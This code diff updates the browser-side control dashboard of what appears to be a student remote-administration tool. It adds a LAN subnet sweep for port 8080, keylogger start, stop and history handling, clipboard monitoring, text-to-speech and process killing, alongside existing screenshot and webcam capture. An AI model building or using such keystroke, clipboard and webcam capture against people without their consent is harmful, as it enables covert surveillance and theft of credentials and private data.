@@ -2,11 +2,12 @@
 let websocket = null;
 let intervalUptime = null;
 let intervalSensors = null;
+let intervalPing = null; // Fix: Added missing variable
 let systemStartTime = 0; 
 let lastScreenshotUrl = null; 
 let lastWebcamUrl = null;
 let pingStartTime = 0;
-
+let isKeylogStopping = false;
 let isRecording = false;
 let webcamTimer = null;
 let webcamTimeout = null; 
@@ -42,13 +43,11 @@ function toggleScanView() {
     const headerArea = document.getElementById('intro-header-area'); 
     
     if(mainView.style.display === 'none') {
-        // Back to Main
         headerArea.classList.remove('hidden-none');
         mainView.style.display = 'block';
         scanView.style.display = 'none';
         isScanning = false; 
     } else {
-        // Go to Scan
         headerArea.classList.add('hidden-none');
         mainView.style.display = 'none';
         scanView.style.display = 'flex';
@@ -68,10 +67,7 @@ function loadHistory() {
                 const chip = document.createElement("div");
                 chip.className = "ip-chip";
                 chip.innerHTML = `<i data-lucide="history"></i> ${ip}`;
-                chip.onclick = () => {
-                   // Connect directly from history
-                   connectToTarget(ip);
-                };
+                chip.onclick = () => { connectToTarget(ip); };
                 container.appendChild(chip);
             });
             if(typeof lucide !== 'undefined') lucide.createIcons();
@@ -103,31 +99,19 @@ function connectToTarget(ip) {
     }, 500);
 }
 
-// === NEW: Handle Scan from Client IP ===
 function handleIntroScan() {
     const clientIP = document.getElementById("intro-ip-input").value.trim();
-    if (!clientIP) {
-        alert("Please enter your Client IP first.");
-        return;
-    }
+    if (!clientIP) { alert("Please enter your Client IP first."); return; }
     
-    // Save client IP for convenience next time
     localStorage.setItem("auralink_client_ip", clientIP);
 
-    // Verify IP format roughly
     const parts = clientIP.split('.');
-    if (parts.length !== 4) {
-        alert("Invalid IP format. Example: 192.168.1.15");
-        return;
-    }
+    if (parts.length !== 4) { alert("Invalid IP format. Example: 192.168.1.15"); return; }
 
-    // Extract Subnet (First 3 parts)
-    parts.pop(); // Remove the 4th octet
-    const subnet = parts.join('.'); // "192.168.1"
+    parts.pop(); 
+    const subnet = parts.join('.'); 
 
-    // Setup Scan View
     document.getElementById('scan-subnet').value = subnet;
-    
     toggleScanView();
     startNetworkScan();
 }
@@ -136,17 +120,14 @@ function startNetworkScan() {
     if (isScanning) return;
     
     const subnet = document.getElementById('scan-subnet').value.trim();
-    if (!subnet) return alert("Subnet error: Please go back and enter Client IP again.");
+    if (!subnet) return alert("Subnet error");
 
     isScanning = true;
     const btnRescan = document.getElementById('btn-rescan');
-    if(btnRescan) {
-        btnRescan.innerText = "Scanning...";
-        btnRescan.disabled = true;
-    }
+    if(btnRescan) { btnRescan.innerText = "Scanning..."; btnRescan.disabled = true; }
 
     const list = document.getElementById('scan-results');
-    list.innerHTML = ""; // Clear old results
+    list.innerHTML = ""; 
     
     const progressBar = document.getElementById('scan-progress');
     const statusText = document.getElementById('scan-status-text');
@@ -158,24 +139,13 @@ function startNetworkScan() {
     for (let i = 1; i <= 254; i++) {
         setTimeout(() => {
             if(!isScanning) return;
-            
             const targetIP = `${subnet}.${i}`;
-            // FIX: Add timestamp to avoid browser caching closed connections
-            // This forces a fresh connection attempt
             const ws = new WebSocket(`ws://${targetIP}:8080/?t=${Date.now()}`);
-            
-            // FIX: Increased timeout to 2000ms for better reliability on Rescan
-            const timer = setTimeout(() => {
-                if(ws.readyState !== WebSocket.OPEN) {
-                    ws.close();
-                }
-            }, 2000); 
+            const timer = setTimeout(() => { if(ws.readyState !== WebSocket.OPEN) ws.close(); }, 2000); 
 
             ws.onopen = () => {
                 clearTimeout(timer);
-                // Important: Update UI BEFORE closing to ensure user sees it
                 foundCount++;
-                
                 const item = document.createElement("div");
                 item.className = "scan-item";
                 item.innerHTML = `
@@ -190,19 +160,14 @@ function startNetworkScan() {
                 `;
                 item.onclick = () => {
                     isScanning = false;
-                    // Close this probing socket if it's still open (though onopen closes it below)
                     if(ws.readyState === WebSocket.OPEN) ws.close();
                     connectToTarget(targetIP);
                 };
                 list.appendChild(item);
                 if(typeof lucide !== 'undefined') lucide.createIcons();
-
-                // Close the probe connection immediately
                 ws.close(); 
             };
-
-            ws.onerror = () => { /* Ignore errors */ };
-            
+            ws.onerror = () => { };
             ws.onclose = () => {
                 scannedCount++;
                 const pct = Math.floor((scannedCount / total) * 100);
@@ -211,40 +176,26 @@ function startNetworkScan() {
 
                 if (scannedCount >= total) {
                     isScanning = false;
-                    if(btnRescan) {
-                        btnRescan.innerText = "Scan Again";
-                        btnRescan.disabled = false;
-                    }
+                    if(btnRescan) { btnRescan.innerText = "Scan Again"; btnRescan.disabled = false; }
                     statusText.innerText = `Scan Complete. Found ${foundCount} active servers.`;
-                    if(foundCount === 0) list.innerHTML = `
-                        <div class="scan-placeholder">
-                            <i data-lucide="search-x" style="width:40px; height:40px; margin-bottom:10px; opacity:0.5"></i>
-                            No servers found on ${subnet}.x <br>
-                            Ensure Server is running on port 8080
-                        </div>`;
+                    if(foundCount === 0) list.innerHTML = `<div class="scan-placeholder"><i data-lucide="search-x"></i> No servers found on ${subnet}.x</div>`;
                     if(typeof lucide !== 'undefined') lucide.createIcons();
                 }
             };
-
-        }, i * 20); // Interval
+        }, i * 20); 
     }
 }
 
 function disconnectServer() {
     if (websocket) {
-        // Ensure clean close
         websocket.onclose = null; 
         websocket.onerror = null;
         websocket.close();
         websocket = null;
     }
-    
-    // Show Intro Page
     const overlay = document.getElementById('intro-overlay');
     overlay.style.display = 'flex';
     setTimeout(() => { overlay.classList.remove('hidden-fade'); }, 10);
-    
-    // Reset Data
     resetDashboardState();
     setConnectedState(false);
     loadHistory(); 
@@ -259,7 +210,17 @@ function switchTab(tabId, element) {
     if(target) target.classList.add('active');
     if(element) element.classList.add('active');
     
-    const titles = { 'home': 'Dashboard', 'apps': 'Application Manager', 'processes': 'System Processes', 'media': 'Screenshot Viewer', 'webcam': 'Webcam Stream', 'keylogger': 'Keylogger Records', 'power': 'Power Control'};
+    const titles = { 
+        'home': 'Dashboard', 
+        'apps': 'Application Manager', 
+        'processes': 'System Processes', 
+        'media': 'Screenshot Viewer', 
+        'webcam': 'Webcam Stream', 
+        'keylogger': 'Keylogger Records', 
+        'power': 'Power Control',
+        'clipboard': 'Clipboard Monitor',
+        'tts': 'Text to Speech'
+    };
     const titleEl = document.getElementById('page-title');
     if(titleEl) titleEl.innerText = titles[tabId] || 'Dashboard';
 }
@@ -284,11 +245,7 @@ function showToast(message, type = 'success') {
     const icon = type === 'success' ? 'check-circle' : 'alert-circle';
     const color = type === 'success' ? '#34d399' : '#fb7185';
     
-    toast.innerHTML = `
-        <i data-lucide="${icon}" style="color: ${color}; width: 20px;"></i>
-        <span>${message}</span>
-    `;
-    
+    toast.innerHTML = `<i data-lucide="${icon}" style="color: ${color}; width: 20px;"></i><span>${message}</span>`;
     container.appendChild(toast);
     if(typeof lucide !== 'undefined') lucide.createIcons();
 
@@ -317,8 +274,6 @@ function connectToServer() {
     saveToHistory(ip);
 
     const wsUri = "ws://" + ip + ":8080/";
-    const btnText = document.getElementById("btn-text");
-    if(btnText) btnText.innerText = "Connecting...";
     
     if (websocket) {
         websocket.onclose = null;
@@ -354,7 +309,6 @@ function connectToServer() {
 }
 
 function setConnectedState(isConnected) {
-    // Toggle Header UI
     const areaDisconnected = document.getElementById("conn-area-disconnected");
     const areaConnected = document.getElementById("conn-area-connected");
     const ipLabel = document.getElementById("connected-ip-label");
@@ -363,17 +317,12 @@ function setConnectedState(isConnected) {
     if (isConnected) {
         areaDisconnected.classList.add("hidden");
         areaConnected.classList.remove("hidden");
-        
         const ip = document.getElementById("ipInput").value;
         if(ipLabel) ipLabel.innerText = "Connected: " + ip;
         if(sysNetwork) { sysNetwork.innerText = "Connected"; sysNetwork.style.color = "#34d399"; }
     } else {
         areaDisconnected.classList.remove("hidden");
         areaConnected.classList.add("hidden");
-        
-        const btnText = document.getElementById("btn-text"); 
-        if(btnText) btnText.innerText = "Connect";
-
         if(sysNetwork) { sysNetwork.innerText = "Disconnected"; sysNetwork.style.color = "#fb7185"; }
         resetDashboardState();
     }
@@ -382,6 +331,14 @@ function setConnectedState(isConnected) {
 function sendCmd(command) {
     if (websocket && websocket.readyState === WebSocket.OPEN) { websocket.send(command); console.log("Sent:", command); } 
     else { console.log("Socket not ready."); }
+}
+
+function sendTTS() {
+    const text = document.getElementById("tts-input").value.trim();
+    if (!text) { showToast("Please enter text", "error"); return; }
+    sendCmd("tts " + text);
+    showToast("Sent TTS Command");
+    document.getElementById("tts-input").value = "";
 }
 
 /* --- UPDATE LOOPS --- */
@@ -458,17 +415,30 @@ function handleIncomingMessage(data) {
         updateSystemStatus("webcam", false);
     } 
     else if (data.startsWith("screenshot ")) { handleScreenshotData(data); }
-    else if (data.startsWith("KEYLOG_DATA:")) {
-        const content = data.substring(12);
-        const box = document.getElementById("keylog-output");
+    
+    // XỬ LÝ CLIPBOARD
+    else if (data.startsWith("CLIPBOARD_DATA:")) {
+        const content = data.substring(15); 
+        const box = document.getElementById("clip-output");
         if(box) {
-             if(box.innerText === "Waiting for data..." || box.innerText === "Session started. Waiting for keys...") box.innerText = "";
-             box.innerText += content;
+             if(box.innerText.includes("Waiting for")) box.innerText = "";
+             box.innerText += content + "\n-------------------\n";
              box.scrollTop = box.scrollHeight;
         }
-        addActivityLog("Fetched keylogs");
-        showToast("Keylogs Fetched");
+        showToast("Clipboard Data Received");
     }
+
+    // XỬ LÝ KEYLOG FORMAT MỚI
+    else if (data.startsWith("MODE:")) {
+        parseKeylogData(data);
+        showToast("Keylogs Updated");
+    }
+    else if (data.startsWith("KEYLOG_DATA:")) { // Fallback cũ
+        const content = data.substring(12);
+        const box = document.getElementById("keylog-text"); // Đổ tạm vào ô text
+        if(box) { box.innerText += content; }
+    }
+
     else if (data.startsWith("DANH SACH UNG DUNG")) { 
         renderAppList(data); 
         addActivityLog("App list updated"); 
@@ -484,12 +454,11 @@ function handleIncomingMessage(data) {
         if(data.includes("Keylogger started")) { updateSystemStatus("keylog", true); showToast("Keylogger Started"); }
         if(data.includes("Keylogger stopped")) { updateSystemStatus("keylog", false); showToast("Keylogger Stopped"); }
         if(data.includes("Started recording")) { updateSystemStatus("webcam", true); showToast("Webcam Recording Started"); }
+        if(data.includes("Server: Clipboard Monitor")) { showToast(data.replace("Server: ", "")); }
+        if(data.includes("Server: OK, speaking")) { showToast("Client is speaking now", "success"); }
+
         if(data.includes("Server:")) addActivityLog(data.replace("Server: ", ""));
-        if(data.includes("Server: Started successfully")) showToast("Process Started Successfully");
-        if(data.includes("Server: Da mo ung dung")) showToast("App Started Successfully");
-        if(data.includes("Server: Da dung ung dung")) showToast("Application Stopped Successfully");
         if(data.includes("Error") || data.includes("Loi") || data.includes("failed")) showToast(data, "error");
-        if(data.includes("Success:") || data.includes("Da diet")) showToast(data.replace("Server: ", ""), "success");
     }
 }
 
@@ -497,56 +466,184 @@ function handleIncomingMessage(data) {
 function startKeylog() {
     sendCmd('start-keylog');
     isKeylogActive = true;
-    const box = document.getElementById("keylog-output");
-    if(box) { box.innerText = "Session started. Waiting for keys..."; }
+    const rawBox = document.getElementById("keylog-raw");
+    const textBox = document.getElementById("keylog-text");
+    if(rawBox) rawBox.innerText = "Session started...";
+    if(textBox) textBox.innerText = "Session started...";
 }
 
 function fetchKeylog() { sendCmd('get-keylog'); }
 
+// --- SỬA LỖI HISTORY KEYLOGGER ---
+// [FIX VẤN ĐỀ 3] LOGIC STOP & SAVE HISTORY
+// --- FIX DỨT ĐIỂM LỖI STOP KEYLOG 2 LẦN ---
+// --- FIX: STOP, FETCH & SAVE CẢ RAW + TEXT ---
+// --- 1. SỬA LẠI NÚT STOP (CHỈ STOP & SAVE, KHÔNG FETCH) ---
+// --- FIX: STOP & SAVE NGAY LẬP TỨC (KHÔNG FETCH) ---
+// --- FIX: QUY TRÌNH STOP & SAVE TỰ ĐỘNG ---
 function stopKeylog() {
-    sendCmd('stop-keylog');
-    isKeylogActive = false;
-    const box = document.getElementById("keylog-output");
-    if(box && box.innerText.length > 5 && !box.innerText.includes("Waiting for keys")) {
-        addToKeylogHistory(box.innerText);
-        showToast("Session Saved to History"); 
+    // 1. Bật cờ hiệu thông báo: "Tôi đang muốn dừng và lưu"
+    isKeylogStopping = true;
+    
+    // 2. Gọi lệnh lấy dữ liệu mới nhất (Server sẽ gửi về sau vài mili-giây)
+    sendCmd('get-keylog');
+    
+    // 3. Thông báo cho người dùng biết đang xử lý
+    showToast("Fetching data & Saving...", "info");
+}
+// --- LOGIC MỚI CHO CLIPBOARD ---
+
+function startClipboard() {
+    sendCmd('start-clip');
+    const box = document.getElementById("clip-output");
+    if(box) box.innerText = "Monitoring started...\n-------------------\n";
+}
+
+function stopClipboard() {
+    sendCmd('stop-clip');
+    
+    // Lưu nội dung hiện tại vào History
+    const box = document.getElementById("clip-output");
+    if(box) {
+        let content = box.innerText;
+        // Lọc bớt các dòng thông báo hệ thống
+        content = content.replace("Monitoring started...", "").replace("Waiting for clipboard data...", "").trim();
+        
+        if(content.length > 0) {
+            addToHistory('clipboard', null, content);
+            showToast("Clipboard Data Saved to History");
+        }
     }
-    if(box) box.innerText = "";
 }
 
+function clearClipboardDisplay() {
+    const box = document.getElementById("clip-output");
+    if(box) box.innerHTML = '<span class="text-muted">Waiting for clipboard data...</span>';
+}
+
+function viewHistoryClipboard(element) {
+    const encodedText = element.getAttribute("data-full");
+    if(!encodedText) return;
+    
+    const text = decodeURIComponent(encodedText);
+    const box = document.getElementById("clip-output");
+    if(box) { 
+        box.innerText = "[HISTORY VIEW]\n-------------------\n" + text; 
+        box.scrollTop = 0; 
+    }
+}
 function clearKeylogDisplay() {
-    const box = document.getElementById("keylog-output");
-    if(box) box.innerText = "";
-    showToast("Screen Cleared"); 
+    document.getElementById("keylog-raw").innerText = "Waiting...";
+    document.getElementById("keylog-text").innerText = "Waiting...";
+    document.getElementById("kl-mode").innerText = "Mode: ---";
+    document.getElementById("kl-status").innerText = "Type: ---";
+    showToast("Screens Cleared"); 
 }
 
-function addToKeylogHistory(text) {
-    const listEl = document.getElementById('keylog-history-list');
-    if (!listEl) return;
-    if (listEl.querySelector('.text-center-small')) listEl.innerHTML = '';
-    const preview = text.substring(0, 50).replace(/\n/g, " ") + "...";
-    const item = document.createElement('div');
-    item.className = 'history-item keylog-item';
-    const safeText = encodeURIComponent(text);
-    item.innerHTML = `
-        <div class="keylog-preview" onclick="viewHistoryKeylog(this)" data-full="${safeText}">
-            <i data-lucide="file-text" style="width:16px; margin-right:5px;"></i> 
-            <span>${preview}</span>
-        </div>
-        <div class="history-meta">
-            <span>${new Date().toLocaleTimeString()}</span>
-            <button class="btn-trash" onclick="deleteHistoryItem(this)"><i data-lucide="trash-2"></i></button>
-        </div>`;
-    listEl.prepend(item);
-    if(typeof lucide !== 'undefined') lucide.createIcons();
+function parseKeylogData(data) {
+    const lines = data.split('\n');
+    let currentSection = "";
+    let rawContent = "";
+    let textContent = "";
+    
+    // [PHẦN 1: TÁCH DỮ LIỆU] (Giữ nguyên logic cũ)
+    lines.forEach(line => {
+        if (line.startsWith("MODE:")) {
+            const el = document.getElementById("kl-mode");
+            if(el) el.innerText = line.trim();
+        }
+        else if (line.startsWith("STATUS:")) {
+            const el = document.getElementById("kl-status");
+            if(el) {
+                el.innerText = line.trim();
+                if(line.includes("VIETNAMESE") || line.includes("Unikey")) el.style.color = "#fb7185";
+                else el.style.color = "#60a5fa";
+            }
+        }
+        else if (line.trim() === "---RAW---") currentSection = "raw";
+        else if (line.trim() === "---TEXT---") currentSection = "text";
+        else {
+            if (currentSection === "raw") rawContent += line + "\n";
+            else if (currentSection === "text") textContent += line + "\n";
+        }
+    });
+
+    // [PHẦN 2: HIỂN THỊ LÊN MÀN HÌNH]
+    const rawBox = document.getElementById("keylog-raw");
+    const textBox = document.getElementById("keylog-text");
+
+    if(rawBox) {
+        // Xóa thông báo chờ nếu có dữ liệu mới
+        if(rawBox.innerText.includes("Waiting...") || rawBox.innerText.includes("Session started")) rawBox.innerText = "";
+        rawBox.innerText += rawContent; // Cộng dồn hoặc thay thế tùy ý (ở đây cộng dồn cho an toàn)
+        rawBox.scrollTop = rawBox.scrollHeight;
+    }
+    
+    if(textBox) {
+        if(textBox.innerText.includes("Waiting...") || textBox.innerText.includes("Session started")) textBox.innerText = "";
+        textBox.innerText += textContent;
+        textBox.scrollTop = textBox.scrollHeight;
+    }
+
+    // [PHẦN 3: LOGIC TỰ ĐỘNG LƯU & DỪNG] (QUAN TRỌNG NHẤT)
+    if (isKeylogStopping) {
+        // Tắt cờ hiệu ngay để không chạy lại lần 2
+        isKeylogStopping = false;
+
+        // 1. Gửi lệnh dừng Server
+        sendCmd('stop-keylog');
+        isKeylogActive = false;
+
+        // 2. Lấy toàn bộ nội dung sạch sẽ để lưu
+        let finalRaw = rawBox ? rawBox.innerText.replace("Waiting...", "").replace("Session started...", "").trim() : "";
+        let finalText = textBox ? textBox.innerText.replace("Waiting...", "").replace("Session started...", "").trim() : "";
+
+        if(finalRaw.length > 0 || finalText.length > 0) {
+            // Ghép 2 phần lại
+            let combinedLog = finalRaw + "|||SPLIT|||" + finalText;
+            
+            // Lưu vào History
+            addToHistory('keylog', null, combinedLog);
+            showToast("Success: Fetched & Saved to History"); 
+        } else {
+            showToast("Stopped (No data found)", "warning");
+        }
+    }
 }
+
 
 function viewHistoryKeylog(element) {
     const encodedText = element.getAttribute("data-full");
     if(!encodedText) return;
-    const text = decodeURIComponent(encodedText);
-    const box = document.getElementById("keylog-output");
-    if(box) { box.innerText = "[HISTORY VIEW]\n" + text; box.scrollTop = 0; }
+    
+    const fullText = decodeURIComponent(encodedText);
+    
+    const rawBox = document.getElementById("keylog-raw");
+    const textBox = document.getElementById("keylog-text");
+    
+    // Reset giao diện trước
+    if(rawBox) rawBox.innerText = "";
+    if(textBox) textBox.innerText = "";
+
+    // Kiểm tra xem dữ liệu có phải loại đã gộp 2 màn hình không
+    if (fullText.includes("|||SPLIT|||")) {
+        // Tách ra làm 2 phần dựa vào dấu phân cách
+        const parts = fullText.split("|||SPLIT|||");
+        const rawPart = parts[0];
+        const textPart = parts[1];
+        
+        if(rawBox) {
+            rawBox.innerText = "[HISTORY VIEW - RAW]\n" + rawPart;
+            rawBox.scrollTop = 0;
+        }
+        if(textBox) {
+            textBox.innerText = "[HISTORY VIEW - TEXT]\n" + textPart;
+            textBox.scrollTop = 0;
+        }
+    } else {
+        // Fallback: Nếu là log cũ (chưa có split), hiện tạm bên Text
+        if(textBox) textBox.innerText = "[HISTORY VIEW]\n" + fullText;
+    }
 }
 
 /* --- SCREENSHOT & HISTORY --- */
@@ -679,15 +776,60 @@ function resetWebcamUI() {
     if(typeof lucide !== 'undefined') lucide.createIcons();
 }
 
-function addToHistory(type, url, label) {
-    const listId = type === 'screenshot' ? 'screenshot-history-list' : 'webcam-history-list';
+// --- HÀM QUẢN LÝ HISTORY TỔNG HỢP (KEYLOG + CLIPBOARD + MEDIA) ---
+function addToHistory(type, url, textContent = "") {
+    let listId = "";
+    if (type === 'screenshot') listId = 'screenshot-history-list';
+    else if (type === 'webcam') listId = 'webcam-history-list';
+    else if (type === 'keylog') listId = 'keylog-history-list';
+    else if (type === 'clipboard') listId = 'clipboard-history-list'; // Thêm dòng này
+    
     const listEl = document.getElementById(listId);
     if (!listEl) return;
+    
     if (listEl.querySelector('.text-center-small')) listEl.innerHTML = '';
+    
     const item = document.createElement('div');
     item.className = 'history-item';
-    let mediaHtml = type === 'screenshot' ? `<img src="${url}" class="history-thumb" onclick="restoreHistoryItem('screenshot', '${url}')" title="View">` : `<video src="${url}" class="history-thumb" controls></video>`;
-    item.innerHTML = `${mediaHtml}<div class="history-meta"><span>${new Date().toLocaleTimeString()}</span><button class="btn-trash" onclick="deleteHistoryItem(this)"><i data-lucide="trash-2"></i></button></div>`;
+    
+    const time = new Date().toLocaleTimeString();
+    
+    // XỬ LÝ GIAO DIỆN CHO TỪNG LOẠI
+    if (type === 'screenshot' || type === 'webcam') {
+        // Giao diện Media (Ảnh/Video)
+        let mediaHtml = type === 'screenshot' 
+            ? `<img src="${url}" class="history-thumb" onclick="restoreHistoryItem('screenshot', '${url}')" title="View">` 
+            : `<video src="${url}" class="history-thumb" controls></video>`;
+            
+        item.innerHTML = `
+            ${mediaHtml}
+            <div class="history-meta">
+                <span>${time}</span>
+                <button class="btn-trash" onclick="deleteHistoryItem(this)"><i data-lucide="trash-2"></i></button>
+            </div>`;
+    } 
+    else {
+        // Giao diện Text (Keylog / Clipboard)
+        const safeText = encodeURIComponent(textContent);
+        // Tạo preview ngắn (50 ký tự đầu)
+        let preview = textContent.substring(0, 50).replace(/\n/g, " ") + (textContent.length > 50 ? "..." : "");
+        if(preview.length === 0) preview = "(Empty data)";
+
+        // Icon khác nhau
+        let icon = type === 'keylog' ? 'file-text' : 'clipboard';
+        let clickFunc = type === 'keylog' ? 'viewHistoryKeylog(this)' : 'viewHistoryClipboard(this)';
+        
+        item.innerHTML = `
+            <div class="keylog-preview" onclick="${clickFunc}" data-full="${safeText}">
+                <i data-lucide="${icon}" style="width:16px; margin-right:5px;"></i> 
+                <span>${preview}</span>
+            </div>
+            <div class="history-meta">
+                <span>${time}</span>
+                <button class="btn-trash" onclick="deleteHistoryItem(this)"><i data-lucide="trash-2"></i></button>
+            </div>`;
+    }
+    
     listEl.prepend(item);
     if(typeof lucide !== 'undefined') lucide.createIcons();
 }
@@ -701,11 +843,13 @@ function deleteHistoryItem(btn) {
 }
 
 function clearHistory(type) { 
-    if(confirm("Clear all history?")) {
+    if(confirm("Clear all history for this section?")) {
         let id;
         if (type === 'screenshot') id = 'screenshot-history-list';
         else if (type === 'webcam') id = 'webcam-history-list';
-        else id = 'keylog-history-list'; 
+        else if (type === 'keylog') id = 'keylog-history-list'; 
+        else if (type === 'clipboard') id = 'clipboard-history-list'; // Thêm dòng này
+        
         const el = document.getElementById(id);
         if(el) el.innerHTML = '<p class="text-center-small">Empty</p>'; 
         showToast("History Cleared"); 
@@ -739,19 +883,71 @@ function handleAppAction(action) {
     sendCmd(cmd); 
 }
 
-function handleProcessAction(action) { 
-    const v = document.getElementById("procInput").value; 
+function handleProcessAction(action, directVal = null) { 
+    // Nếu có directVal (bấm nút) thì dùng luôn, nếu không thì lấy từ ô input
+    const v = directVal || document.getElementById("procInput").value; 
+    
     if(!v) { showToast("Please enter PID or Name", "error"); return; }
+    
+    // Thêm xác nhận trước khi kill để tránh bấm nhầm
+    if (action === 'kill') {
+        if (!confirm(`Are you sure you want to KILL process PID: ${v}?`)) return;
+    }
+
     sendCmd(`${action} ${v}`); 
+    
+    // Sau khi kill, tự động refresh lại danh sách sau 1 giây
+    if (action === 'kill') {
+        setTimeout(() => sendCmd('ps'), 1000);
+    }
 }
 
 function renderProcessTable(d, id) {
-    const tb = document.getElementById(id); if(!tb) return; tb.innerHTML = "";
-    d.trim().split('\n').slice(1).forEach(r => {
-        const c = r.split('\t'); if(c.length >= 4) {
-            const tr = document.createElement("tr"); tr.innerHTML = `<td><strong>${c[0]}</strong></td><td>${c[3]}</td><td>${c[2]}</td><td>${c[1]}</td>`; tb.appendChild(tr);
+    const tb = document.getElementById(id);
+    if (!tb) return;
+    tb.innerHTML = "";
+
+    // Dữ liệu Server trả về theo thứ tự: PID [0] | RAM [1] | Threads [2] | Name [3]
+    const lines = d.trim().split('\n');
+    
+    // Bỏ dòng đầu tiên (Header của Server gửi về)
+    lines.slice(1).forEach(r => {
+        const c = r.split('\t');
+        if (c.length >= 4) {
+            const pid = c[0];
+            const ramRaw = parseFloat(c[1]); // Chuyển RAM sang số để kiểm tra
+            const threads = c[2];
+            const name = c[3];
+
+            // LOGIC MỚI: Xử lý hiển thị RAM
+            // Nếu RAM <= 0 (Process hệ thống/bảo mật), hiện "N/A" màu xám
+            let ramDisplay;
+            if (ramRaw <= 0) {
+                ramDisplay = `<span style="color:#cbd5e1; font-style:italic;">N/A</span>`;
+            } else {
+                ramDisplay = `<span style="color:#60a5fa;">${ramRaw.toFixed(1)} MB</span>`;
+            }
+
+            const tr = document.createElement("tr");
+
+            // Render HTML: Khớp với thứ tự Header (PID | Name | Threads | RAM | Action)
+            tr.innerHTML = `
+                <td><strong>${pid}</strong></td>
+                <td>${name}</td>
+                <td>${threads}</td>
+                <td>${ramDisplay}</td>
+                <td style="text-align: center;">
+                    <button class="btn-icon-small" onclick="handleProcessAction('kill', '${pid}')" title="End Process">
+                        <i data-lucide="x-circle" style="color: #fb7185;"></i>
+                    </button>
+                </td>
+            `;
+            tb.appendChild(tr);
         }
     });
+
+    // Kích hoạt lại icon Lucide cho các nút mới thêm
+    if (typeof lucide !== 'undefined') lucide.createIcons();
 }
 function requestScreenshot() { sendCmd("screenshot"); }
 
